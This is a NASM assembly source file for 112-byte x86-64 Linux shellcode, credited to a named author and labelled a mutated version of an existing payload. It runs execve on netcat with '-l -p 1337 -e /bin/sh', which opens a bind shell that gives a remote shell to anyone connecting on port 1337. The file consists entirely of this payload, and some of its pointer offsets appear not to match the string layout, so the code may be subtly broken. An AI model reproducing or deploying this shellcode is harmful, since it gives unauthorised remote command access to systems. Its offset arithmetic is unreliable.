; File: shellcode-822_nc_traditional_mutated.nasm
; Author: Petr Javorik
; Size: 112 bytes
; Description: execve nc.traditional with relative RIP indexing

global _start

section .text


_start:

	jmp real_start
    data: db '/bin/nc.traditionalA', '-lA', '-pA', '1337A', '-eA', '/bin/shA'

real_start:

    xor     rdx, rdx                ; char *const envp[] = NULL
    lea rdi, [rel data -1]          ; const char *filename = '/bin/nc.traditional'

    push rdx                        ; terminate array of pointers to arguments (char *const argv[])
    lea r9, [rdi +34]
    push r9                         ; push pointer to '/bin/shA'
    mov [rdi +41], dl               ; terminate '/bin/shA' with NULL

    lea r9, [rdi +31]
    push r9                         ; push pointer to '-eA'
    mov [rdi +33], dl               ; terminate '-eA' with NULL

    lea r9, [rdi +26]
    push r9                         ; push pointer to '1337A'
    mov [rdi +30], dl               ; terminate '1337A' with NULL

    lea r9, [rdi +23]
    push r9                         ; push pointer to '-pA'
    mov [rdi +25], dl               ; terminate '-pA' with NULL

    lea r9, [rdi +20]
    push r9                         ; push pointer to '-lA'
    mov [rdi +22], dl               ; terminate '-lA' with NULL

    push rdi                        ; push pointer to '/bin/nc.traditionalA'
    mov [rdi +19], dl                ; terminate '/bin/nc.traditionalA' with NULL

    mov rsi, rsp                    ; point RSI to created char *const argv[]
    mov al, 59                      ; execve syscall, int execve(const char *filename, char *const argv[], char *const envp[]);
    syscall
